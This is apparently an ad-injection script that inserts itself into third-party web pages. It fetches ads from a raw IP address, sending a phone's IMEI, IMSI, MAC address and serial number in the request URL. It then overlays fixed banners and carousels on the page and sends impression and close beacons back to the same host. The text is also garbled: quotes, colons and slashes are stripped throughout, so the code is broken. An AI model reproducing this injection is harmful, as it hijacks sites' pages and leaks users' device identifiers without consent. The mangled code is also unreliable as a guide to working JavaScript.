div id=ea8179
    script type=textjavascript
	var once_lieying;
	var host = window.location.hostname;

    var url=http + host + Home/apiv2/webkit.js#code#;
     var numNewadType=4;
     var url=http://120.76.78.224:88/Home/apiv2/webkit.js?adType=4&type=taobao&model=SCL-CL00&imei=A0000059363AC3&imsi=460036261551867&mac=24df6a38b842&sn=AAAABBBBCCCCDDDD&vendor=Huawei&and_version=4.4.4&version=1.1&from=yingyonghui001&country=china&region=shenzhen&newadType=+numNewadType;


=============================================start
        if (window.top == window.self && !once_lieying) {
			      once_lieying=true;
            makeCorsRequest(url, function (text) {
              if(text){
                console.log(text.substring(0,100));
                if(text.trim().substring(0,1)===){
                  console.log(!DOCTYPE html fangxuecong);
                  var objData=objData  ;
                    showDefault(objData);
                    return ;
                }
              }else{
                console.log(text not correct+text);
                var objData=objData  ;
                  showDefault(objData);
                  return ;
              }

                 var objData=objData  ;
                 showDefault(objData);
                 return ;

                var objData = JSON.parse(text);
                if (objData.statue) {
                    var type = objData.data.type;
                    var finalData = objData.data.data;
                    switch (type) {
                        case 1
                            show12(finalData,objData);
                            break;
                        case 2
                            show12(finalData,objData);
                            break;
                        case 3
                            var cssText = '#ea8179{displayblock !important;positionstatic !important;topauto !important;leftauto !important;}img,object{max-width100%;}#ly_adzz {box-sizingborder-box;-moz-box-sizingborder-box;-webkit-box-sizingborder-box}#ly_adzz a{text-decorationnone;color#000}#ly_adzz afocus{outline0}#ly_adzz{padding-bottom10px;background#FFF}#ly_adzz .ly_f96ce_wrap{background#FFF;padding12px 28px 0;border-top1px solid #eee;border-bottom1px solid #eee}#ly_adzz .ly_f96ce_head .ly_f96ce_h3{font-size14px;color#a3a3a3;floatleft;margin0;line-height22px;height24px;font-weight700}#ly_adzz .ly_f96ce_update{floatright;line-height22px;height24px}#ly_adzz .ly_f96ce_update a{font-size13px;line-height22px;height24px;displayblock}#ly_adzz .ly_f96ce_update img{margin-top5px;height12px !important;width55px !important;}#ly_adzz .ly_f96ce_listafter{displayblock;visibilityhidden;clearboth;height0;contentThilina Fong}.clearfixafter{displayblock;visibilityhidden;clearboth;height0;contentThilina Fong}#ly_adzz .ly_f96ce_list{padding10px 0}#ly_adzz .ly_f96ce_list-left{floatleft;width48%}#ly_adzz .ly_f96ce_list-right{floatright;width52%;padding-left10px}#ly_adzz .ly_f96ce_list .ly_f96ce_p{line-height36px;height36px;margin0}.ly_f96ce_plast-child{displaynone;}#ly_adzz .ly_f96ce_list .ly_f96ce_pafter{displayblock;visibilityhidden;clearboth;height0;contentThilina Fong}#ly_adzz .ly_f96ce_list a{displayblock;max-width80%;font-size13px;line-height36px;overflowhidden;text-overflowellipsis;white-spacenowrap;floatleft}#ly_adzz .ly_f96ce_list .ly_f96ce_p span{color#d94847;font-size11px;background#ffe0de;margin-left4px;floatleft;line-height11px;margin-top10px;padding2px;text-aligncenter;displayblock}';
                            setTimeout(function () {
                                show34(cssText,finalData);
                            }, 1000);
                            break;
                        case 4
                            var cssText = '#ea8179{displayblock !important;positionstatic !important;topauto !important;leftauto !important;}body{font-size12px}img,object{max-width100%}#ly_adzz {box-sizingborder-box;-moz-box-sizingborder-box;-webkit-box-sizingborder-box}#ly_adzz a{text-decorationnone;color#000}#ly_adzz afocus{outline0}#ly_adzz{background#FFF;padding0 0 10px}#ly_adzz .ly_f96ce_wrap{background#FFF;padding0;border-bottom1px solid #e1e1e1}#ly_adzz .ly_f96ce_head{border-top1px solid #e7e7e7;border-bottom1px solid #e7e7e7;padding10px 12px}#ly_adzz .ly_f96ce_head .ly_f96ce_h3{font-size14px;color#000;floatleft;margin0;font-weight700}#ly_adzz .ly_f96ce_update{floatright}#ly_adzz .ly_f96ce_update a{font-size13px;line-height22px;height24px;displayblock}#ly_adzz .ly_f96ce_update img{margin-top5px;height12px !important;width55px !important;}#ly_adzz .ly_f96ce_listafter{displayblock;visibilityhidden;clearboth;height0;contentThilina Fong}.clearfixafter{displayblock;visibilityhidden;clearboth;height0;contentThilina Fong}#ly_adzz .ly_f96ce_list-left{floatleft;width50%}#ly_adzz .ly_f96ce_list-right{floatright;width50%}#ly_adzz .ly_f96ce_list .ly_f96ce_p{font-size12px;line-height28px;margin0 5px;positionrelative;border-bottom1px solid #e9e9e9;padding-left6px}.ly_f96ce_pfirst-child{displaynone;border-bottomnone}#ly_adzz .ly_f96ce_list .ly_f96ce_plast-child{border-bottomnone}#ly_adzz .ly_f96ce_list .ly_f96ce_pafter{displayblock;visibilityhidden;clearboth;height0;contentThilina Fong}#ly_adzz .ly_f96ce_list a{displayblock;max-width75%;font-size13px;line-height36px;overflowhidden;text-overflowellipsis;white-spacenowrap;floatleft}#ly_adzz span.ly_f96ce_hot{color#FFF;font-size10px;background#F20;margin-left2px;margin-top5px;floatleft;displayblock;height14px;line-height14px;text-aligncenter;padding0 2px}#ly_adzz .ly_f96ce_list-left strong.ly_f96ce_sepa{background#e9e9e9;width1px;height28px;displayblock;positionabsolute;top5px;right-6px}#ly_adzz .ly_f96ce_list-right strong.ly_f96ce_sepa{displaynone}';
                            setTimeout(function () {
                                show34(cssText,finalData);
                            }, 1000);
                            break;
                        case 5
                            var cssText = 'img,object{max-width100%}#ly_adzz{positionfixed;z-index2147483647;left0;bottom0;width100vw;width100%;line-height1.375em}#ly_adzz h3{width22%;background#000;margin0;font-weight400;font-size12px;line-height24px;height24px;positionrelative;color#CFCFCF;text-aligncenter}#ly_adzz h3 span{displayblock;height100%;width10px;positionabsolute;right-24px;top0;width0;height0;border-left12px solid #000;border-right12px solid rgba(255,255,255,0);border-top12px solid rgba(255,255,255,0);border-bottom12px solid #000}#ly_adzz .article{floatright;width70%}#ly_adzz .m{background#000;color#FFF;padding5px 5px 0}#ly_adzz .ly_Content .mlast-of-type{padding-bottom5px}#ly_adzz .m a.thumbnail{displayblock;floatleft;width30%;color#FFF;text-decorationnone}#ly_adzz .m a.thumbnail img{max-width100%;bordernone}#ly_adzz .m h5{padding5px 14px 12px;margin0;max-height30px;overflowhidden;margin-bottom10px}#ly_adzz .m h5 a{text-decorationnone;color#FFF;font-size15px;line-height22px;font-weight400;font-familyMicrosoft YaHei,Verdana,Geneva,sans-serif}#ly_adzz .m p{font-size12px;padding-left14px;color#606060}#ly_Closed{positionabsolute;right8px;top3px;width38px;height38px;text-aligncenter;line-height33px;color#FFF;font-size15px;displaynone}';
                            addCss(cssText);
                            document.getElementById(ea8179).insertAdjacentHTML(afterBegin, finalData);
                            setTimeout(function () {
                                document.getElementById('ly_Closed').style.display = 'block';
                                document.getElementById('ly_Closed').innerHTML = 'svg data-name=Livello 1 id=Livello_1 viewBox=0 0 151.57 151.57 xmlns=httpwww.w3.org2000svgtitletitlecircle cx=1038.5 cy=467.01 r=72.28 style=fill#da2244;stroke#f2f2f2;stroke-linecapround;stroke-linejoinround;stroke-width7px transform=translate(-988.78 479.89) rotate(-45)circleline style=fill#da2244;stroke#f2f2f2;stroke-linecapround;stroke-linejoinround;stroke-width7px x1=47.57 x2=103.99 y1=103.99 y2=47.57lineline style=fill#da2244;stroke#f2f2f2;stroke-linecapround;stroke-linejoinround;stroke-width7px x1=45.8 x2=105.7 y1=45.87 y2=105.77linesvg';
                                document.getElementById('ly_Closed').onclick = function () {
                                    document.getElementById(ea8179).style.display = 'none';
                                    ly_adzz_ajax('close', objData.data.logid);
                                };
                            }, 3000);
                            break;
                        case 6
                            var cssText = '#ea8179{displayblock !important;positionstatic !important;topauto !important;leftauto !important;}#ly_fxc_ad_wrap,#ly_fxc_ad_wrap {-webkit-box-sizingborder-box;box-sizingborder-box;font-familyMicrosoft Yahei}body,html{width100%;height100%;background-color#fff;-webkit-font-smoothingantialiased;margin0;padding0}#ly_fxc_ad_wrap img{bordernone;max-width100%}#ly_fxc_ad_wrap a{text-decorationnone;transitionall .2s ease-out;-webkit-tap-highlight-colortransparent;color#000;}#ly_fxc_ad_wrap afocus{outline0}#ly_fxc_ad_wrap .clearfixafter{clearboth;displayblock;visibilityhidden;height0;contentThilina Fong}#ly_fxc_ad_wrap .ellip{overflowhidden;max-width300px;text-overflowellipsis;white-spacenowrap}.ly_fxc_ul{display-webkit-box;overflowhidden}.ly_f96ce_ceil{padding15px;height120px;background#f7f7f7;width70%;margin0 10px;-webkit-transformtranslate(0,0);}.ly_f96ce_ceil.trst{-webkit-transition-webkit-transform .2s ease-out;}.ly_f96ce_ceilfirst-child{margin-left0}.ly_f96ce_ceillast-child{margin-right0}.ly_f96ce_ceil .ly_f96ce_h3{margin-top0;margin-bottom10px;font-size16px;font-weight700}.ly_f96ce_ceil .ly_f96ce_p{font-size14px;color#333;margin20px 0;line-height1.6em}.ly_f96ce_ceil .ly_f96ce_net{color#888;font-size11px;displaynone;}.ly_f96ce_ceil a strong{color#337cbb;font-weight700;font-size14px}';
                            setTimeout(function () {
                                if (!findSertPiont(330)) {
                                  var objData=objData  ;
                                    showDefault(objData);
                                    return ;
                                } else {
                                    addCss(cssText);
                                    document.getElementsByClassName(rt120d76)[0].insertAdjacentHTML(beforebegin, finalData);
                                }
                                if (document.getElementsByClassName('ly_f96ce_ceil').length  3) {
                                    document.getElementById('ly_fxc_ad_wrap').style.display = 'none';
                                    var objData=objData  ;
                                    showDefault(objData);
                                    return ;
                                }
                                var ly_fxc_ul = document.getElementsByClassName('ly_fxc_ul')[0];
                                var wrapW = ly_fxc_ul.getBoundingClientRect().width;
                                var ly_f96ce_ceils = document.getElementsByClassName('ly_f96ce_ceil');
                                var ceilW = ly_f96ce_ceils[0].getBoundingClientRect().width;
                                var x = (wrapW - ceilW - 40)  2;
                                var DelteX = ceilW - x;
                                var DelteX2 = ceilW + 20;
                                var DelteX3 = (ceilW + 20)  (ly_f96ce_ceils.length - 3) + ceilW - x;
                                var DelteXEnd = DelteX3 + DelteX;
                                TT(0);
                                function TT(DX) {
                                    for (var i = 0; i  ly_f96ce_ceils.length; i++) {
                                        ly_f96ce_ceils[i].style.WebkitTransform = 'translate(' + DX + 'px, 0px)';
                                    }
                                }
                                function addClassTrst() {
                                    for (var i = 0; i  ly_f96ce_ceils.length; i++) {
                                        ly_f96ce_ceils[i].className += ' trst';
                                    }
                                }
                                function leaveClassly_f96ce_ceil() {
                                    for (var i = 0; i  ly_f96ce_ceils.length; i++) {
                                        ly_f96ce_ceils[i].className = 'ly_f96ce_ceil';
                                    }
                                }
                                function getNowX() {
                                    var tf = ly_f96ce_ceils[0].style.WebkitTransform;
                                    return parseInt(tf.substring(10));
                                }
                                function huadong() {
                                    addClassTrst();
                                    if(j==ly_f96ce_ceils.length){
                                        j=0;
                                    }
                                    if(j==0){
                                        TT(0);
                                    }else if(j == ly_f96ce_ceils.length - 1){
                                        TT(-DelteXEnd);
                                    }else{
                                        TT(-(DelteX + DelteX2  (j - 1)));
                                    }
                                    j++;
                                }
                                var j = 0;
                                var Timer = null;
                                Timer = window.setInterval(function () {
                                    huadong();
                                }, 3000);
                                var startX, NowX;
                                ly_fxc_ul.addEventListener('touchstart', function (ev) {
                                    if (ev.targetTouches.length === 1) {
                                        window.startX = ev.touches[0].pageX;
                                        window.NowX = getNowX();
                                    } else {
                                        return;
                                    }
                                    window.clearInterval(Timer);
                                    Timer = window.setInterval(function () {
                                        huadong();
                                    }, 3000);
                                }, false);
                                ly_fxc_ul.addEventListener('touchmove', function (ev) {
                                    ev.preventDefault();
                                    leaveClassly_f96ce_ceil();
                                    var userX = ev.touches[0].pageX - window.startX;
                                    TT(window.NowX + userX);
                                }, false);
                                ly_fxc_ul.addEventListener('touchend', function (ev) {
                                    addClassTrst();
                                    var leftOrRight = ev.changedTouches[0].pageX - window.startX;
                                    if (-getNowX() = DelteX) {
                                        if (leftOrRight  0) {
                                            TT(-DelteX);
                                        } else {
                                            TT(0);
                                        }
                                    } else if (-getNowX() = DelteX3) {
                                        if (leftOrRight  0) {
                                            TT(-DelteXEnd);
                                        } else {
                                            TT(-DelteX3);
                                        }
                                    } else {
                                        if (leftOrRight  0) {
                                            TT(window.NowX - DelteX2);
                                        } else {
                                            TT(window.NowX + DelteX2);
                                        }
                                    }
                                }, false);
                            }, 1000);
                            break;
                        default
                        var objData=objData  ;
              							showDefault(objData);
              							return;
                    }
                } else {
                  var objData=objData  ;
                    showDefault(objData);
                    console.log('statue none.');
                    return;
                }
            });
        }

functions
        function createCORSRequest(method, url) {
            var xhr = new XMLHttpRequest();
            if (withCredentials in xhr) {
                xhr.open(method, url, true);
            } else if (typeof XDomainRequest != undefined) {
                xhr = new XDomainRequest();
                xhr.open(method, url);
            } else {
                xhr = null;
            }
            return xhr;
        }
        function getTitle(text) {
            return text.match('')[1];
        }
        function makeCorsRequest(url, doWithText) {
            var xhr = createCORSRequest('GET', url);
            if (!xhr) {
               console.log(xhr create fail.);
               var objData=objData  ;
                showDefault(objData);
                return;
            }
            xhr.onabort=function(){
              console.log('Cors abort');
              var objData=objData  ;
                showDefault(objData);
                return;
            };
            xhr.onerror=function(){
              console.log('Cors error');
              var objData=objData  ;
                showDefault(objData);
                return;
            };
            xhr.ontimeout=function(){
              console.log('Cors timeout');
                showDefault(objData);
                return;
            };
            xhr.onload = function () {
              console.log('cors loaded');
                var text = xhr.responseText;
                var title = getTitle(text);
                doWithText(text);
            };
            xhr.send();
        }
        function ly_adzz_ajax(type, ly_logid) {
            var xmlhttp;
            if (window.XMLHttpRequest) {
                xmlhttp = new XMLHttpRequest();
            } else {
                xmlhttp = new ActiveXObject(Microsoft.XMLHTTP);
            }
            xmlhttp.onreadystatechange = function () {
                if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                }
            }
            xmlhttp.open(GET, http120.76.78.22488HomeAdwordsclosetype + type + logid + ly_logid, true)
            xmlhttp.send();
        }
        function addCss(cssText) {
            var tagHead = document.getElementsByTagName('head')[0];
            var tagStyle = document.createElement('style');
            var textCSS = document.createTextNode(cssText);
            tagStyle.type = 'textcss';
            tagStyle.appendChild(textCSS);
            tagHead.appendChild(tagStyle);
        }
        function simpleGet(url) {
            var xmlhttp = new XMLHttpRequest();
            xmlhttp.open(GET, url, true);
            xmlhttp.send();
        }
        function isSomeNet() {
            var someNet = deeporiginalx.comphoto.m.yiche.comso.m.jd.com;
            return (someNet.test(window.location.href));
        }
        function findSertPiont(tarHeight) {
            var divs = document.body.getElementsByTagName('div');
            var sections = document.body.getElementsByTagName('section');
            var uls = document.body.getElementsByTagName('ul');
            var wrapW = document.getElementById('ea8179').getBoundingClientRect().width;
            for (var x = 0; x  divs.length; x++) {
                var tar = divs[x].offsetTop;
                var tarW = divs[x].getBoundingClientRect().width;
                var styles=window.getComputedStyle(divs[x],null);
                if (tar  tarHeight && tarW = (wrapW-4) && tar  2000 && styles.position!=fixed) {
                    divs[x].className += ' rt120d76';
                    return true;
                }
            }
            for (var y = 0; y  sections.length; y++) {
                var tar2 = sections[y].offsetTop;
                var tar2W = sections[y].getBoundingClientRect().width;
                var styles2=window.getComputedStyle(sections[y],null);
                if (tar2  tarHeight && tar2W = (wrapW-4) && tar2  2000 && styles2.position!=fixed) {
                    sections[y].className += ' rt120d76';
                    return true;
                }
            }
            for (var z = 0; z  uls.length; z++) {
                var tar3 = uls[z].offsetTop;
                var tar3W = uls[z].getBoundingClientRect().width;
                var styles3=window.getComputedStyle(uls[z],null);
                if (tar3  tarHeight && tar3W = (wrapW-4) && tar3  2000 && styles3.position!=fixed) {
                    uls[z].className += ' rt120d76';
                    return true;
                }
            }
            return false;
        }
        function show12(insertData,objData){
          document.getElementById(ea8179).insertAdjacentHTML(afterBegin, insertData);
          document.getElementById(ly_adzz_del).onclick = function () {
              document.getElementById(ea8179).style.display = 'none';
              ly_adzz_ajax('close', objData.data.logid);
          };
          var oLyAdzz = document.getElementById('ly_adzz');
          var impressionUrl = oLyAdzz.getAttribute('impression');
          simpleGet(impressionUrl);
        }
        function show34(cssText,finalData){
          if (!findSertPiont(330)) {
            var objData=objData  ;
              showDefault(objData);
              return ;
          } else {
              addCss(cssText);
              document.getElementsByClassName(rt120d76)[0].insertAdjacentHTML(beforebegin, finalData);
          }
          var iii = 0;
          var arrList = document.getElementById('ly_adzz').getElementsByClassName('ly_f96ce_list');
          var len = arrList.length;
          document.getElementById('ly_adzz_update').onclick = function () {
              iii++;
              if (iii === len) {
                  iii = 0;
              }
              for (var jjj = 0; jjj  len; jjj++) {
                  arrList[jjj].style.display = 'none';
              }
              arrList[iii].style.display = 'block';
          };
        }
        function showDefault(objData){
            if (window.top == window.self) {
              var defaultData='div id=ly_adzz impression=httpas.lieying.cnimp.htmlversion=1.0&aid=38&sid=10&cid=84&mid=214&guid=638b0c5b2e2f438d9d7e2eb1904106a6&lon=%%LON%%&lat=%%LAT%% style=position fixed;heightauto;width 100%;z-index2147483647;bottom0;left0px;styleimg#ly_adzz_del{max-width50px;}a.qiao7fonghokcung,img.qiao7fonghokcung{max-height165px;max-width 100%;displayblock !important;position static !important;topauto !important;left auto !important;}#ly_adzz{displayblock !important;position fixed !important;topauto !important;heightauto !important;width 100% !important;z-index2147483647 !important;bottom0 !important;left0px !important;}stylediv style=positionrelative;margin-right auto;margin-left auto;width 100%;max-width 1080px;background-color #FFF;border none;font-size 14px;font-weight bold;img id=ly_adzz_del width=50 height=50 style=margin-top 0px;margin-left 0px;max-height50px;position absolute;display block; src=dataimagepng;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAACw0lEQVR4nO3av48SQRQH8MWYWFtoY7CwMLnyCv+CO8QT87zLzBBg2Ku8S+goqC1MGQTjm4hgYAy82+kGP+IItdCfE44NiZT3JK2g28z7s7M57s56ImDIGyXfe5kh7QilCDDzPq5UeQkSM1vq0ghAxAJoVhIghOVovj7Qnk3YsFovXFYSI0VqryDC6FQQYcw8z6tVECJGKVWvIMI4qyBEDMnLCiKM7xVEGN0KQsSQFVBhDGODQHA+L5vgiCwNrEgCIzv+wZAUnfEn1gQxB6vZ7p9XpWMIIgWF8vQYxlLIhNBBsYmwibGEncFbEgtk38WAyb10r8jrCVQMoI8Z8RNhJJGyGK+G+NOAllBMH+PuIhiWUFIQr7O8tDEswYghFXtcauRDOI4Lb6vChrCFE4bYfcQhGBhAMgJfOi65dGFlAkKR6ljmAcNFzsPScH6ukZeHpdOTrry8Pp2efeZpQ+XsNDxvW2wn30fkrehy8sVMHsvw9dvCFkQeGzMkOZ1On1qFsNW3TLJfSfKL9+Ie1GbneyEOtjL+Xz+wjrEJoatdr7LNj6Ar3cQyvahCEk9m82elx5CRD5uRSgZxM1wOHxSagiSK6XUm3sRSgTxeSdCGSBI9ncuiZJALLTWrYiFBmC5EprfYghCJDAGgcjFBUCACtByEUEQLAj3a7ajUEEcjFAkCQOtohCJAkFyRvDwaoAgQJH+LyFlshDxDkPy5tcFSFohoKXwaj8ePrSHkEOJmbxVZcAhF8sNBxVNBIZYkv00mk2fOALIMQRIAWlYfhgdAXJAcpJ18BDAQkYs7hy8JjprW+hRAk+Qo4eRHAJrRgWxt70wTHDWSJwAaItIRkZnl5Gci0gHQIHniZSz5XaOmlKprrc9JXgG4FpEuyT7JEck5ydvo372Nfo9I9kWkC+Ca5JXW+lwpVfcymvhfHKBsIRd7nuMAAAAASUVORK5CYII=div style=margin-right auto;margin-left auto;width 100%;a class=qiao7fonghokcung href=httpplugin.sz.zazaj.comhomeimgurldefault.do target=_blankimg class=qiao7fonghokcung style=width 100%;  src=httpplugin.sz.zazaj.comhomeimgsrcdefaultadivdivdiv';
              show12(defaultData,objData);
              console.log(PLK-UL00-9);
            }
        }
    script
div
